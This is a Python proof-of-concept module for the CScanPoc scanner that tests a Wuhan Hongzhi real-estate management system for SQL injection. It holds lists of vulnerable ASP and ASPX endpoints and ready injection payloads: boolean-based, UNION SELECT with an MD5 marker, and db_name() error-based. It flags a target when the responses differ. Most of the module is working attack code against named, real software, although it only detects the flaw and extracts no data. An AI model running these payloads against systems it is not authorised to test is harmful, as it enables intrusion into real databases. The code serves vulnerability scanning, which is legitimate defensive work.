# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re


class Vuln(ABVuln):
    vuln_id = 'Hongzhi_0002_p'  # 平台漏洞编号，留空
    name = '武汉弘智房产管理系统通用 SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2014-10-16'  # 漏洞公布时间
    desc = '''
         武汉弘智科技房产管理系统SQL注入漏洞。
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '弘智房产管理系统'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '8161b68a-77a9-4fe8-a8f9-503d43a4cca4'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-11'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # refer:http://www.wooyun.org/bugs/wooyun-2010-079522
            # refer:http://www.wooyun.org/bugs/wooyun-2010-086386
            # refer:http://www.wooyun.org/bugs/wooyun-2010-086420
            # refer:http://www.wooyun.org/bugs/wooyun-2010-0107410
            # refer:http://www.wooyun.org/bugs/wooyun-2010-0107625
            # refer:http://www.wooyun.org/bugs/wooyun-2010-0108362
            # refer:http://www.wooyun.org/bugs/wooyun-2010-0110327
            # refer:http://www.wooyun.org/bugs/wooyun-2010-0110638
            hh = hackhttp.hackhttp()
            payloads = [
                '/PubInfo/lpxx.asp?qyxmbm=1',
                '/web/PubInfo/lpxx.asp?qyxmbm=1',
                '/PubInfo/StatData.asp?QryToday=1',
                '/web/PubInfo/StatData.asp?QryToday=1',
                '/PubInfo/AreaAnalysis.asp?Qrylx=Qrylx=gymj&Qryszqx=1',
                '/web/PubInfo/AreaAnalysis.asp?Qrylx=Qrylx=gymj&Qryszqx=1'
            ]
            getdata1 = '%27%20or%20%271%27%3D%271'
            getdata2 = '%27%20or%20%271%27%3D%272'
            for payload in payloads:
                url1 = self.target + payload + getdata1
                url2 = self.target + payload + getdata2
                code1, head, res1, errcode, _ = hh.http(url1)
                code2, head, res2, errcode, _ = hh.http(url2)
                m1 = re.findall('td', res1)
                m2 = re.findall('td', res2)
                if m1 != m2:
                    #security_hole(arg + payload + '   :found sql Injection')
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

            payloads = [
                '/pubinfo/xmdljgxx_Detail.asp?jgbh=',
                '/web/pubinfo/xmdljgxx_Detail.asp?jgbh=',
            ]
            getdata = '%27%20union%20all%20select%201,2,3,4,5,6,7,8,sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271234%27)),10,11,12,13,14--'
            for payload in payloads:
                url = self.target + payload + getdata
                code, head, res, errcode, _ = hh.http(url)
                if code == 200 and '0x81dc9bdb52d04dc20036dbd8313ed055' in res:
                    #security_hole(arg + payload + '   :found sql Injection')
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

            payloads = [
                '/Article.asp?wzxh=1',
                '/web/Article.asp?wzxh=1',
            ]
            getdata1 = '%20or%201=1'
            getdata2 = '%20or%201=2'
            for payload in payloads:
                url1 = self.target + payload + getdata1
                url2 = self.target + payload + getdata2
                code1, head, res1, errcode, _ = hh.http(url1)
                code2, head, res2, errcode, _ = hh.http(url2)
                if code1 == 200 and code2 == 200 and 'href' in res1 and 'href' not in res2:
                    #security_hole(arg + payload + '   :found sql Injection')
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

            payloads = [
                '/PubInfo/Ranklist.asp?rank=',
                '/web/PubInfo/Ranklist.asp?rank='
            ]
            getdata = 'sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271234%27))'
            for payload in payloads:
                url = self.target + payload + getdata
                code, head, res, errcode, _ = hh.http(url)
                if code == 200 and '0x81dc9bdb52d04dc20036dbd8313ed055' in res:
                    #security_hole(arg + payload + '   :found sql Injection')
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

            payloads = [
                '/Web_Site/NewsMore.aspx?lmid=1',
                '/web/Web_Site/NewsMore.aspx?lmid=1'
            ]
            getdata = '%29and%20db_name%281%29=0--'
            for payload in payloads:
                url = self.target + payload + getdata
                code, head, res, errcode, _ = hh.http(url)
                if code == 500 and 'master' in res:
                    #security_hole(arg + payload + '   :found sql Injection')
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

            payloads = [
                '/Web_Site/Search.aspx?type=0&keyword=',
                '/web/Web_Site/Search.aspx?type=0&keyword='
            ]
            getdata = '%27and%20db_name%281%29%3D0--'
            for payload in payloads:
                url = self.target + payload + getdata
                code, head, res, errcode, _ = hh.http(url)
                if code == 500 and 'master' in res:
                    #security_hole(arg + payload + '   :found sql Injection')
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
